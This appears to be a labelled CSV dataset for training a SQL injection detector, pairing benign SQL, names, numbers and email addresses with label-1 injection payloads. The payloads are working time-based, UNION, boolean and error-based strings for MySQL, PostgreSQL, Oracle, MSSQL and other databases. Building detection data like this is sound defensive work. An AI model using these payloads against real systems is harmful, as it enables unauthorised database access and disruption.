Query,Label
rincn,0
"select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1
"1'||  (  select 'gtri' from dual where 7097  =  7097 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1
2111,0
"SELECT excellent,funny FROM salt WHERE but = 'means' UNION SELECT muscle, percent FROM statement",0
SELECT AVG ( ants ) FROM go,0
select   (  case when   (  9030  =  6952  )   then 1 else 9030*  (  select 9030 from master..sysdatabases  )   end  )  --,1
"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",1
25613,0
robieux,0
boyadgian@campanasextractoras.tv,0
SELECT COUNT ( wheel ) FROM lying,0
8029,0
"1%'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM bean WHERE morning IN  ( SELECT find FROM selection ),0
SELECT * FROM space WHERE place NOT BETWEEN 'barn' AND 'forest',0
19133,0
"SELECT * FROM low ORDER BY helpful, were",0
SELECT * FROM remove WHERE pool IN  ( SELECT one FROM phrase ),0
SELECT * FROM party WHERE    NOT factory = 'torn',0
FROM  ( SELECT DISTINCT adult FROM show ),0
"1  )   union all select null,null,null,null,null,null,null,null,null#",1
SELECT differ ( s )  FROM hall,0
1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',1
"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"UPDATE article SET excellent =  'zipper', City =  'wherever' WHERE roof =  owner",0
SELECT * FROM end WHERE foot NOT LIKE 'zipper%',0
SELECT AVG ( Price ) FROM who,0
SELECT TOP 3 * FROM movie WHERE art = 'shop' SELECT * FROM wish,0
1  )   as selm where 5759  =  5759,1
-4607'||  (  select 'wkdg' where 7524  =  7524 order by 1--,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",1
SELECT *FROM  ( SELECTcolumn_name ( s )  FROM,0
"c/ animas, 101,",0
"1""  )   as vqkz where 8536  =  8536",1
orieta,0
1'  )   as lgex where 4068  =  4068 and 1378  =  9247--,1
SELECT * FROM essential,0
1'  )   rlike   (  select   (  case when   (  7447  =  3981  )   then 1 else 0x28 end   )    ),1
aldea del cano,0
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1
1  )   where 3565  =  3565 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
exigidad,0
-4979'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'ofgg'  =  'ofgg,1
SELECT * FROM easier WHERE soon = 'hunt'  OR minerals = 'from',0
03046730n,0
1'  )   as rbpx where 1264  =  1264,1
"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",1
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",1
SELECT * FROM crack,0
graciot ballv,0
SELECT * FROM freedom FETCH FIRST 50 PERCENT ROWS ONLY,0
apotrerar,0
"c/ pedro guezala 192, 6?a",0
46838,0
"SELECT * FROM cotton WHERE kids NOT IN  ( 'within', 'connected', 'pattern' )",0
"1,  (  case when 8260  =  8260 then 1 else null end  )",1
galindo beneyto,0
"-7409""   )    )    union all select 3145,3145,3145--",1
4.47874E+15,0
SELECT part ( s )  FROM found,0
koontz,0
SELECT * FROM practical  WHERE front NOT LIKE '[exact]%',0
7.28065E+15,0
mathurin,0
SELECT * FROM arm WHERE cold = 'balance',0
-3499'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap,1
cambiazo,0
"select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1
1' and non_existant_table   =   '1,1
SELECT * FROM fruit  WHERE toy NOT LIKE '[bend]%',0
SELECT national ( s ) FROM dug INNER JOIN,0
SELECT * FROM rain 3,0
"1  )   where 5309  =  5309 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT TOP 50 PERCENT * FROM particularly,0
mongo,0
SELECT COUNT ( design )  FROM begun,0
millana,0
"1""   )    )    as tybm where 2687  =  2687 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
DELETE FROM slight WHERE central = 'produce',0
1   )    )     )   union all select null--,1
kresl,0
SELECT certainly ( s )  FROM compare FULL OUTER JOIN,0
1'  )   and 2305  =  1934,1
"1%' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"SELECT breakfast,golden,spider,ship,magnet     (  (  clothes JOIN mind ON may.while =  neighbor.writing )   INNER JOIN bareON Orders.definition =  phrase.principalID )",0
"select * from users where id  =  '1' or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
41953346n,0
84638109h,0
peluffo1@psicoencuentronline.va,0
FROM  ( SELECT DISTINCT magnet FROM stone ),0
1'+  (  select 'jkgf' where 7487  =  7487,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",1
"1'||  (  select 'kgjk' where 3530  =  3530 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
69634179t,0
"SELECT * FROM consonant WHERE grandfather BETWEEN ""living"" AND    ""against""",0
82380804w,0
SELECT * FROM husband WHERE them BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT COUNT ( write ) FROM poet,0
DELETE FROM hill WHERE aboard = 'opposite',0
SELECT * FROM mental FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM course,0
1 where 3354  =  3354,1
SELECT hall FROM means UNION ALL SELECT connected FROM chart ORDER BY similar,0
9140,0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'home-page-template' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,0
"-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#",1
SELECT Count ( * )  AS silk,0
SELECT * FROM basket WHERE kind NOT BETWEEN 'contrast' AND 'silly',0
vallb remesar,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'crkz'  =  'crkz",1
SELECT DISTINCT day FROM one,0
4742,0
yevtushenko-pegna@corjet.al,0
SELECT fix FROM air UNION ALL SELECT national FROM pale ORDER BY cat,0
c/ torre de romo s/n 1f,0
SELECT basis ( s )  FROM why UNION ALL,0
wardle,0
SELECT government FROM dull UNION SELECT colony FROM fourth ORDER BY personal,0
else dbms_lock.sleep  (  0  ),1
5.27381E+14,0
select   (  case when   (  8208  =  7960  )   then 8208 else 8208*  (  select 8208 from information_schema.character_sets  )   end  )  #,1
SELECT * FROM pride FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grandfather,0
SELECT * FROM willing,0
SELECT AVG ( sit ) FROM terrible SELECT SUM ( mass ),0
SELECT AVG ( forest ) FROM drop SELECT SUM ( eat ),0
"-8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793#",1
SELECT glass ( s )  FROM keep UNION,0
velasque9,0
nacer,0
"1%""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
-5365 or 7517  =  5726--,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""%""  =  """,1
"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",1
"select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1
SELECT AVG ( refused ) FROM check,0
membro,0
1'  )   as tqdg where 9355  =  9355,1
"SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card",0
1  )   rlike sleep  (  5  )   and   (  5724  =  5724,1
"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",1
70132648j,0
"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",1
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""ladc"" like ""ladc",1
"1   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   1402  =  1402",1
SELECT throw ( s FROM son RIGHT JOIN,0
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",1
"SELECT COUNT ( everywhere ) , smoke FROM total BY degree",0
vilafams,0
select sleep  (  5  )   and    (    (   8679  =  8679,1
bears,0
SELECT * FROM repeat WHERE game = 'field' LIMIT 3,0
-3938%'   )    )     )   or 2034  =  7209#,1
"-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1
"-4068'   )    )     )   union all select 9491,9491,9491--",1
"SELECT peace AS belt, today AS [leather]  FROM begun",0
"1'||  (  select 'ymwf' where 1229  =  1229 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
1'+  (  select snam where 1993  =  1993,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,1
SELECT discovery ( s FROM kept RIGHT JOIN,0
DELETE FROM closely WHERE below = 'higher',0
1'   )    )    as eltx where 9955  =  9955 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   3038  =  3038",1
SELECT column_name FROM table_name WHERE condition GROUP BY column_name ORDER BY column_name;,0
"INSERT INTO grade ( chapter, do, graph, exactly, steady, news )  VALUES  ( 'motor', 'cannot'. regular', 'edge', 'burst', 'flag', 'never' )",0
1   )    )    as bvij where 7913  =  7913,1
"-6766"" where 6591  =  6591 or make_set  (  9354  =  9354,7185  )  --",1
"SELECT baseball, look, groundFROM busy WHERE change  IS NOT NULL",0
"SELECT * FROM mother WHERE improve BETWEEN ""greatest"" AND    ""circle""",0
SELECT * FROM future WHERE already = 'letter',0
SELECT TOP 50 PERCENT * FROM leader,0
1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,1
"SELECT wrote, none, frequentlyFROM settle WHERE against  IS NOT NULL",0
1'||  (  select 'zyvk' from dual where 2072  =  2072,1
cheyenne,0
3.06517E+15,0
aira vials,0
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",1
select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,1
"SELECT value,section,touch,aware,air     (  (  wise JOIN fully ON box.exchange =  careful.respect )   INNER JOIN noneON Orders.brick =  paper.richID )",0
19332,0
"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466",1
"SELECT * FROM struck WHERE separate IN  ( 'never', 'tool', 'planning' )",0
64446970g,0
4s2cu8e44,0
SELECT TOP 3 * FROM influence WHERE rear = 'straight' SELECT * FROM specific,0
SELECT * FROM putting ORDER BY south DESC,0
jaazael,0
SELECT high FROM sweet,0
1'+  (  select 'gprq' where 8928  =  8928,1
e7ato,0
SELECT * FROM CustomersWHERE Country = 'Germany'LIMIT 3;,0
SELECT * FROM coast WHERE floor NOT LIKE '[physical]%',0
SELECT COUNT ( cake ) FROM porch,0
SELECT * FROM clear 3,0
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )",1
"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
gilda6@mytanga.om,0
SELECT region ( s )  FROM coffee UNION ALL,0
SELECT BIN ( 15 ) ;,0
freixes navaln,0
"SELECT box,driving,represent,noise,doctor     (  (  deer JOIN lead ON neck.dust =  scared.teeth )   INNER JOIN petON Orders.central =  likely.continentID )",0
marmolejos,0
SELECT AVG ( camera ) FROM attached SELECT SUM ( welcome ),0
if  (  3490  =  4920  )   select 3490 else drop function hlzt--,1
betty,0
aineln,0
1%' or sleep  (  5  )  #,1
"SELECT earlier, few+ ', ' + hospital+ ' ' + direction+ ', ' + rich AS arrow  FROM higher",0
23734,0
"INSERT INTO shot ( group, daughter, busy, slow, check, completely )  VALUES  ( 'combination', 'personal'. dog', 'closely', 'hot', 'desk', 'hurt' )",0
SELECT pig FROM near UNION SELECT position FROM earth ORDER BY happen,0
"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",1
8.11985E+15,0
SELECT AVG ( won ) FROM foreign,0
pagny@cpanelweb.yu,0
graciliano,0
"SELECT COUNT ( studying ) , program FROM score BY former",0
volkmann_parfrey1@sigloventidos.be,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""%""  =  """,1
"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM lucky WHERE stream = 'seems',0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'qvoy'  =  'qvoy",1
-9363%' or   (  8459  =  8459  )  *4906 and '%'  =  ',1
SELECT TOP 3 * FROM traffic SELECT * FROM rock 3SELECT * FROM grew,0
"1%'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",1
SELECT * FROM shade WHERE depend NOT BETWEEN 'milk' AND 'possibly',0
"-5591%""   )    )    order by 1--",1
1%'   )    )     )   union all select null#,1
oda,0
lightfie,0
"1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  #",1
if  (  8574  =  7534  )   select 8574 else drop function nxbe--,1
"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",1
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,0
"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",1
"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",1
arajol lo cascio,0
"1   )    )    as debc where 7428  =  7428 union all select null,null,null#",1
"1%'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",1
SELECT * FROM cave ORDER BY whale,0
"SELECT COUNT ( atom ) , consonant FROM basket BY shinning",0
SELECT * FROM flag WHERE thrown = 'hour'  AND  ( heart = 'spell' OR open = 'massage' ),0
"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
50422961s,0
"1""  )   where 1107  =  1107 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
-6377' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'qcms' like 'qcms,1
"SELECT * FROM table WHERE obtain IN  ( 'became', 'vowel', 'completely' )",0
4376,0
SELECT blanket ( s ) FROM standard INNER JOIN,0
SELECT * FROM perfect,0
hi or a  =  a,1
SELECT AVG ( strong ) FROM loose SELECT SUM ( shade ),0
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 252091 )  ORDER BY meta_id ASC",0
SELECT COUNT ( palaceID ) FROM went,0
1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367748 )  ORDER BY meta_id ASC",0
"1%'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1
SELECT * FROM future WHERE NOT stream = 'replace'  AND NOT call = 'pay',0
SELECT * FROM just WHERE Price NOT BETWEEN 10 AND 20,0
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'mvkg'  =  'mvkg",1
SELECT COUNT ( engineerID ) FROM sight,0
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  # ewsz,1
brewton,0
SELECT * FROM clock WHERE porch = 'character',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347681,262330,292419,262334 )  ORDER BY meta_id ASC",0
"INSERT INTO high  ( straw, fire, spring )  VALUES  ( 'amount', 'tried', 'boy' )",0
pari073l,0
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""  )   where 3250  =  3250 union all select null#",1
6.50345E+15,0
"-7971   )    )    as armw where 9474  =  9474 or make_set  (  9354  =  9354,7185  )  --",1
denice,0
"1'  )   as nmzp where 3794  =  3794 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",1
"SELECT * FROM Users WHERE Name  = ""John Doe"" AND Pass  = ""myPass""",0
SELECT * FROM husband 3,0
pg_sleep  (  __TIME__  )  --,1
vitalia,0
"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",1
FROM  ( SELECT DISTINCT solar FROM cotton ),0
SELECT * FROM flag WHERE parallel  BETWEEN 10 AND 20,0
SELECT * FROM mad WHERE Price NOT BETWEEN 10 AND 20,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2712' LIMIT 1,0
gnaeding,0
SELECT edge ( s )  FROM tree FULL OUTER JOIN,0
"1'   )    )    as pstn where 6691  =  6691 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",1
nao,0
"SELECT * FROM let WHERE plural IN  ( 'oil', 'hang', 'fifty' )",0
SELECT dress ( s )  FROM fence FULL OUTER JOIN,0
"SELECT out, red, bow FROM pressure WHERE information  IS NULL",0
-6488' or 5164  =  9234,1
SELECT MIN ( brush )  AS unknown FROM meat,0
SELECT * FROM private WHERE perfect BETWEEN '1996-07-01' AND '1996-07-31',0
declare @s varchar  (  22  )   select @s   =,1
ibarra,0
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",1
SELECT DISTINCT plan FROM widely,0
SELECT * FROM outer WHERE great BETWEEN doing09/01/1996kind AND image15/31/1996oxygen,0
bernette2,0
SELECT * FROM sport WHERE fighting = 'dropped' LIMIT 3,0
SELECT AVG ( faster ) FROM seldom SELECT SUM ( rain ),0
"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""ffcf"" like ""ffcf",1
SELECT COUNT ( judge )  FROM camp,0
"SELECT * FROM simply WHERE rush NOT IN  ( 'pride', 'general', 'hold' )",0
"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",1
"1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
select   (  case when   (  1227  =  4014  )   then 1227 else 1227*  (  select 1227 from mysql.db  )   end  )  #,1
garek,0
joya,0
SELECT * FROM throat FETCH FIRST 3 ROWS ONLY,0
1'   )    )    and sleep  (  5  )  #,1
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ),1
"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3140' LIMIT 1,0
1   )    )     )   and 7533  =  7533 and    (    (     (  7740  =  7740,1
SELECT * FROM writer,0
"-8893%'  )   union all select 1254,1254--",1
"1   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5137  =  5137",1
SELECT * FROM thick FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM hope FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM recall,0
SELECT fort ( s )  FROM be FULL OUTER JOIN,0
SELECT * FROM day WHERE out = 'function',0
1'+  (  select 'qbdh' where 4006  =  4006 and 7533  =  7533  )  +',1
SELECT * FROM memory,0
FROM  ( SELECT DISTINCT sit FROM create ),0
"1""  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT behavior ( s )  FROM enjoy FULL OUTER JOIN,0
terrill,0
SELECT * FROM ahead FETCH FIRST 50 PERCENT ROWS ONLY,0
a' or 'a'   =   'a,1
SELECT Count ( * )  AS leave,0
SELECT origin FROM method UNION ALL SELECT principle FROM battle ORDER BY one,0
39699852n,0
SELECT * FROM die WHERE ball = 'edge',0
43427,0
"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1
"1' union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM below WHERE here NOT LIKE '[having]%',0
SELECT * FROM chapter FETCH FIRST 3 ROWS ONLY,0
"1  )   where 7748  =  7748 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
-7548 or 2850  =  9666,1
SELECT * FROM women WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM married,0
1'+  (  select trte where 9173  =  9173 and 2006  =  2006,1
"SELECT fence,discover,syllable,those,coast     (  (  shoot JOIN strike ON exist.near =  basis.market )   INNER JOIN rhymeON Orders.table =  torn.roseID )",0
"1%""  )   union all select null,null,null,null,null,null,null,null#",1
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'ymad' like 'ymad",1
"SELECT Orders.fifteenrID, Employees.attempt, Employees.date FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.forestID ORDER BY Orders.anywayID",0
1'+  (  select 'luhy' where 3112  =  3112 and   (  3020  =  3020  )  *6703  )  +',1
53933880f,0
select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,1
1'||  (  select 'mnvk' from dual where 4181  =  4181,1
SELECT * FROM common WHERE planned NOT BETWEEN 'satellites' AND 'victory',0
